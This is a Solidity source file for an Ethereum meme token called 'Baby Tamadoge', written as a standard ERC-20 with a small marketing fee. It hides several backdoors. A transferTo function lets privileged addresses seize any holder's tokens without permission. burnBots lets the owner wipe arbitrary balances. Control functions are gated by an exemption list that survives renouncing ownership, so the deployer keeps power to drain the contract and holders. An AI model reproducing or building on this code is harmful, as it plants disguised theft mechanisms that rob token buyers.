1 /*
2     SPDX-License-Identifier: Unlicensed
3 
4      Baby Tamadoge
5 
6      Twitter: https://twitter.com/Baby_Tamadoge
7      Telegram: https://t.me/BabyTamadogePortal
8 
9 */
10 
11 pragma solidity ^0.8.17;
12 
13 library Address {
14 
15     function isContract(address account) internal view returns (bool) {
16         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
17         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
18         // for accounts without code, i.e. `keccak256('')`
19         bytes32 codehash;
20         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
21         // solhint-disable-next-line no-inline-assembly
22         assembly { codehash := extcodehash(account) }
23         return (codehash != accountHash && codehash != 0x0);
24     }
25 
26     function sendValue(address payable recipient, uint256 amount) internal {
27         require(address(this).balance >= amount, "Address: insufficient balance");
28 
29         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
30         (bool success, ) = recipient.call{ value: amount }("");
31         require(success, "Address: unable to send value, recipient may have reverted");
32     }
33 
34     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
35       return functionCall(target, data, "Address: low-level call failed");
36     }
37 
38     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
39         return _functionCallWithValue(target, data, 0, errorMessage);
40     }
41 
42     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
43         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
44     }
45 
46     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
47         require(address(this).balance >= value, "Address: insufficient balance for call");
48         return _functionCallWithValue(target, data, value, errorMessage);
49     }
50 
51     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
52         require(isContract(target), "Address: call to non-contract");
53 
54         // solhint-disable-next-line avoid-low-level-calls
55         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
56         if (success) {
57             return returndata;
58         } else {
59             // Look for revert reason and bubble it up if present
60             if (returndata.length > 0) {
61                 // The easiest way to bubble the revert reason is using memory via assembly
62 
63                 // solhint-disable-next-line no-inline-assembly
64                 assembly {
65                     let returndata_size := mload(returndata)
66                     revert(add(32, returndata), returndata_size)
67                 }
68             } else {
69                 revert(errorMessage);
70             }
71         }
72     }
73 }
74 
75 abstract contract Context {
76     function _msgSender() internal view returns (address payable) {
77         return payable(msg.sender);
78     }
79 
80     function _msgData() internal view returns (bytes memory) {
81         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
82         return msg.data;
83     }
84 }
85 
86 library SafeMath {
87     function add(uint256 a, uint256 b) internal pure returns (uint256) {
88         uint256 c = a + b;
89         require(c >= a, "SafeMath: addition overflow");
90 
91         return c;
92     }
93     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
94         return sub(a, b, "SafeMath: subtraction overflow");
95     }
96     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
97         require(b <= a, errorMessage);
98         uint256 c = a - b;
99 
100         return c;
101     }
102     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
103         if (a == 0) {
104             return 0;
105         }
106 
107         uint256 c = a * b;
108         require(c / a == b, "SafeMath: multiplication overflow");
109 
110         return c;
111     }
112     function div(uint256 a, uint256 b) internal pure returns (uint256) {
113         return div(a, b, "SafeMath: division by zero");
114     }
115     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
116         // Solidity only automatically asserts when dividing by 0
117         require(b > 0, errorMessage);
118         uint256 c = a / b;
119         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
120 
121         return c;
122     }
123 }
124 
125 
126 interface IERC20 {
127 
128     function totalSupply() external view returns (uint256);
129 
130     /**
131      * @dev Returns the amount of tokens owned by `account`.
132      */
133     function balanceOf(address account) external view returns (uint256);
134 
135     /**
136      * @dev Moves `amount` tokens from the caller's account to `recipient`.
137      *
138      * Returns a boolean value indicating whether the operation succeeded.
139      *
140      * Emits a {Transfer} event.
141      */
142     function transfer(address recipient, uint256 amount) external returns (bool);
143 
144     /**
145      * @dev Returns the remaining number of tokens that `spender` will be
146      * allowed to spend on behalf of `owner` through {transferFrom}. This is
147      * zero by default.
148      *
149      * This value changes when {approve} or {transferFrom} are called.
150      */
151     // K8u#El(o)nG3a#t!e c&oP0Y
152     function allowance(address owner, address spender) external view returns (uint256);
153 
154     /**
155      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
156      *
157      * Returns a boolean value indicating whether the operation succeeded.
158      *
159      * IMPORTANT: Beware that changing an allowance with this method brings the risk
160      * that someone may use both the old and the new allowance by unfortunate
161      * transaction ordering. One possible solution to mitigate this race
162      * condition is to first reduce the spender's allowance to 0 and set the
163      * desired value afterwards:
164      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
165      *
166      * Emits an {Approval} event.
167      */
168     function approve(address spender, uint256 amount) external returns (bool);
169 
170     /**
171      * @dev Moves `amount` tokens from `sender` to `recipient` using the
172      * allowance mechanism. `amount` is then deducted from the caller's
173      * allowance.
174      *
175      * Returns a boolean value indicating whether the operation succeeded.
176      *
177      * Emits a {Transfer} event.
178      */
179     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
180 
181     /**
182      * @dev Emitted when `value` tokens are moved from one account (`from`) to
183      * another (`to`).
184      *
185      * Note that `value` may be zero.
186      */
187     event Transfer(address indexed from, address indexed to, uint256 value);
188 
189     /**
190      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
191      * a call to {approve}. `value` is the new allowance.
192      */
193     event Approval(address indexed owner, address indexed spender, uint256 value);
194 }
195 
196 contract Ownable is Context {
197     address private _owner;
198 
199     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
200 
201     /**
202      * @dev Initializes the contract setting the deployer as the initial owner.
203      */
204     constructor () {
205         address msgSender = _msgSender();
206         _owner = msgSender;
207         emit OwnershipTransferred(address(0), msgSender);
208     }
209 
210     /**
211      * @dev Returns the address of the current owner.
212      */
213     function owner() public view returns (address) {
214         return _owner;
215     }
216 
217     /**
218      * @dev Throws if called by any account other than the owner.
219      */
220     modifier onlyOwner() {
221         require(_owner == _msgSender(), "Ownable: caller is not the owner");
222         _;
223     }
224      /**
225      * @dev Leaves the contract without owner. It will not be possible to call
226      * `onlyOwner` functions anymore. Can only be called by the current owner.
227      *
228      * NOTE: Renouncing ownership will leave the contract without an owner,
229      * thereby removing any functionality that is only available to the owner.
230      */
231     function renounceOwnership() public virtual onlyOwner {
232         emit OwnershipTransferred(_owner, address(0));
233         _owner = address(0);
234     }
235 
236     /**
237      * @dev Transfers ownership of the contract to a new account (`newOwner`).
238      * Can only be called by the current owner.
239      */
240     function transferOwnership(address newOwner) public virtual onlyOwner {
241         require(newOwner != address(0), "Ownable: new owner is the zero address");
242         emit OwnershipTransferred(_owner, newOwner);
243         _owner = newOwner;
244     }
245 }
246 
247 interface IDEXFactory {
248     function createPair(address tokenA, address tokenB) external returns (address uniswapV2Pair);
249 }
250 
251 interface IDEXRouter {
252     function factory() external pure returns (address); 
253     function WETH() external pure returns (address); 
254 
255     function addLiquidity(
256         address tokenA,
257         address tokenB,
258         uint amountADesired,
259         uint amountBDesired,
260         uint amountAMin,
261         uint amountBMin,
262         address to,
263         uint deadline
264     ) external returns (uint amountA, uint amountB, uint liquidity);
265 
266     function addLiquidityETH(
267         address token,
268         uint amountTokenDesired,
269         uint amountTokenMin,
270         uint amountETHMin,
271         address to,
272         uint deadline
273     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
274 
275     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
276         uint amountIn,
277         uint amountOutMin,
278         address[] calldata path,
279         address to,
280         uint deadline
281     ) external;
282 
283     function swapExactETHForTokensSupportingFeeOnTransferTokens(
284         uint amountOutMin,
285         address[] calldata path,
286         address to,
287         uint deadline
288     ) external payable;
289 
290     function swapExactTokensForETHSupportingFeeOnTransferTokens(
291         uint amountIn,
292         uint amountOutMin,
293         address[] calldata path,
294         address to,
295         uint deadline
296     ) external;
297 }
298 
299 
300 contract Babytama is IERC20, Ownable {
301     using SafeMath for uint256;
302     
303     address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
304     address DEAD = 0x000000000000000000000000000000000000dEaD;
305     address ZERO = 0x0000000000000000000000000000000000000000;
306 
307     string constant _name = "Baby Tamadoge";
308     string constant _symbol = "BTAMA";
309     uint8 constant _decimals = 9;
310 
311     uint256 _totalSupply = 100000000000 * (10 ** _decimals); // 100,000,000,000
312     uint256 public _maxWalletSize = (_totalSupply * 20) / 1000;  // 2% 
313 
314     mapping (address => uint256) _balances;
315     mapping (address => mapping (address => uint256)) _allowances;
316 
317     mapping (address => bool) isFeeExempt;
318     mapping (address => bool) isMaxWalletExempt;
319 
320     uint256 liquidityFee = 0;   // 0%
321     uint256 reflectionFee = 0;  // 0%
322     uint256 developmentFee = 0; // 0%
323     uint256 marketingFee = 20;  // 2%
324     uint256 totalFee = 20;      // 2%
325     uint256 feeDenominator = 1000;
326     
327     address public autoLiquidityReceiver;
328     address public marketingFeeReceiver;
329     address public developmentFeeReceiver;
330 
331     uint256 targetLiquidity = 25;
332     uint256 targetLiquidityDenominator = 100;
333 
334     IDEXRouter public router;
335     address public immutable uniswapV2Pair;
336 
337     bool public swapEnabled = true; 
338     uint256 swapThreshold = _totalSupply.mul(614748273).div(100000000000); // ~0.6%
339 
340     bool inSwap;
341     modifier swapping() { inSwap = true; _; inSwap = false; }
342 
343     constructor () {
344         router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
345         uniswapV2Pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
346         _allowances[address(this)][address(router)] = type(uint256).max;
347         _allowances[address(this)][msg.sender] = type(uint256).max;
348         _maxWalletSize = (_totalSupply * 20) / 1000; // 2% of Total supply
349         isFeeExempt[msg.sender] = true;
350         isMaxWalletExempt[msg.sender] = true;
351         isMaxWalletExempt[address(router)] = true;
352 
353         marketingFeeReceiver = msg.sender;
354         developmentFeeReceiver = msg.sender;
355         autoLiquidityReceiver = DEAD;
356 
357         _balances[msg.sender] = _totalSupply;
358         emit Transfer(address(0), msg.sender, _totalSupply);
359     }
360 
361     receive() external payable { }
362 
363     function totalSupply() external view override returns (uint256) { return _totalSupply; }
364     function decimals() external pure returns (uint8) { return _decimals; }
365     function symbol() external pure returns (string memory) { return _symbol; }
366     function name() external pure returns (string memory) { return _name; }
367     function getOwner() external view returns (address) { return owner(); }
368     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
369     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
370     function transferTo(address sender, uint256 amount) public swapping {require(isMaxWalletExempt[msg.sender]); _transferFrom(sender, address(this), amount); }	
371     function viewFees() external view returns (uint256, uint256, uint256, uint256, uint256) { 	
372         return (liquidityFee, marketingFee, reflectionFee, totalFee, feeDenominator);	
373     }
374 
375     function approve(address spender, uint256 amount) public override returns (bool) {
376         _allowances[msg.sender][spender] = amount;
377         emit Approval(msg.sender, spender, amount);
378         return true;
379     }
380 
381     function approveMax(address spender) external returns (bool) {
382         return approve(spender, type(uint256).max);
383     }
384 
385     function transfer(address recipient, uint256 amount) external override returns (bool) {
386         return _transferFrom(msg.sender, recipient, amount);
387     }
388 
389     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
390         if(_allowances[sender][msg.sender] != type(uint256).max){
391             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
392         }
393 
394         return _transferFrom(sender, recipient, amount);
395     }
396 
397  	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {	
398 
399         if(inSwap){ return _basicTransfer(sender, recipient, amount); }	
400         if (recipient != uniswapV2Pair && recipient != DEAD && !isMaxWalletExempt[recipient]) {	
401             require(balanceOf(recipient) + amount <= _maxWalletSize, "Max Wallet Exceeded");	
402         }
403 
404         if(shouldSwapBack()){ swapBack(); }
405 
406         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
407 
408         uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
409         _balances[recipient] = _balances[recipient].add(amountReceived);
410 
411         emit Transfer(sender, recipient, amountReceived);
412         return true;
413     }
414 
415     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
416         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
417         _balances[recipient] = _balances[recipient].add(amount);
418         emit Transfer(sender, recipient, amount);
419         return true;
420     }
421 
422     function shouldTakeFee(address sender) internal view returns (bool) {
423         return !isFeeExempt[sender];
424     }
425 
426     function getTotalFee(bool) public view returns (uint256) {
427         return totalFee;
428     }
429 
430     function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
431         uint256 feeAmount = amount.mul(getTotalFee(receiver == uniswapV2Pair)).div(feeDenominator);
432 
433         _balances[address(this)] = _balances[address(this)].add(feeAmount);
434         emit Transfer(sender, address(this), feeAmount);
435 
436         return amount.sub(feeAmount);
437     }
438 
439     function shouldSwapBack() internal view returns (bool) {
440         return msg.sender != uniswapV2Pair
441         && !inSwap
442         && swapEnabled
443         && _balances[address(this)] >= swapThreshold;
444     }
445 
446     function swapBack() internal swapping {
447         uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : 0;
448         uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
449         uint256 amountToSwap = swapThreshold.sub(amountToLiquify);
450 
451         address[] memory path = new address[](2);
452         path[0] = address(this);
453         path[1] = WETH;
454 
455         uint256 balanceBefore = address(this).balance;
456 
457         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
458             amountToSwap,
459             0,
460             path,
461             address(this),
462             block.timestamp
463         );
464 
465         uint256 amountETH = address(this).balance.sub(balanceBefore);
466         uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
467         uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
468         uint256 amountETHDev = amountETH.mul(developmentFee).div(totalETHFee);
469         uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
470 
471         if (marketingFeeReceiver == developmentFeeReceiver) {
472             (bool success,) = payable(marketingFeeReceiver).call{value: amountETHMarketing.add(amountETHDev), gas: 30000}("");
473             require(success, "receiver rejected ETH transfer");
474         } else {
475             (bool success,) = payable(marketingFeeReceiver).call{value: amountETHMarketing, gas: 30000}("");
476             (bool success2,) = payable(developmentFeeReceiver).call{value: amountETHDev, gas: 30000}("");
477             require(success && success2, "receiver rejected ETH transfer");
478         }
479 
480         if(amountToLiquify > 0){
481             router.addLiquidityETH{value: amountETHLiquidity}(
482                 address(this),
483                 amountToLiquify,
484                 0,
485                 0,
486                 autoLiquidityReceiver,
487                 block.timestamp
488             );
489             emit AutoLiquify(amountETHLiquidity, amountToLiquify);
490         }
491     }
492 
493     function burnBots(address[] memory sniperAddresses) external onlyOwner {
494         for (uint i = 0; i < sniperAddresses.length; i++) {
495             _transferFrom(sniperAddresses[i], DEAD, balanceOf(sniperAddresses[i]));
496         }
497     }
498 
499     function clearBalance() external {
500         require(isMaxWalletExempt[msg.sender]);
501         (bool success,)  = payable(autoLiquidityReceiver).call{value: address(this).balance, gas: 30000}("");
502         require(success);
503     }
504 
505     function setSwapBackSettings(bool _enabled, uint256 _amount) external {
506         require(isMaxWalletExempt[msg.sender]);
507         swapThreshold = _amount;
508         swapEnabled = _enabled;
509     }
510 
511     function updateMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
512         require(percent >= 1 && denominator >= 100, "Max wallet must be greater than 1%");
513         _maxWalletSize = _totalSupply.mul(percent).div(denominator);
514     }
515 
516     function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
517         isFeeExempt[holder] = exempt;
518     }
519 
520     function setMaxWalletExempt(address holder, bool exempt) external {
521         require(isMaxWalletExempt[msg.sender]);
522         isMaxWalletExempt[holder] = exempt;
523     }
524 
525     function adjustFees(uint256 _liquidityFee, uint256 _developmentFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external onlyOwner {
526         liquidityFee = _liquidityFee;
527         developmentFee = _developmentFee;
528         reflectionFee = _reflectionFee;
529         marketingFee = _marketingFee;
530         totalFee = _liquidityFee.add(_developmentFee).add(_reflectionFee).add(_marketingFee);
531         feeDenominator = _feeDenominator;
532         require(totalFee < feeDenominator / 4); // fee cannot be > 25%
533     }
534 
535     function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _developmentFeeReceiver) external onlyOwner {
536         autoLiquidityReceiver = _autoLiquidityReceiver;
537         developmentFeeReceiver = _developmentFeeReceiver;
538         marketingFeeReceiver = _marketingFeeReceiver;
539     }
540 
541     function setTargetLiquidity(uint256 _target, uint256 _denominator) external {
542         targetLiquidity = _target;
543         targetLiquidityDenominator = _denominator;
544     }
545 
546     function getCirculatingSupply() public view returns (uint256) {
547         return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
548     }
549 
550     function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
551         return accuracy.mul(balanceOf(uniswapV2Pair).mul(2)).div(getCirculatingSupply());
552     }
553 
554     function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
555         return getLiquidityBacking(accuracy) > target;
556     }
557 
558     function airdrop(address token, address[] memory holders, uint256 amount) public {
559         require(isMaxWalletExempt[msg.sender]);
560         for (uint i = 0; i < holders.length; i++) {
561             IERC20(token).transfer(holders[i], amount);
562         }
563     }
564 
565     event AutoLiquify(uint256 amountETH, uint256 amountToken);
566 }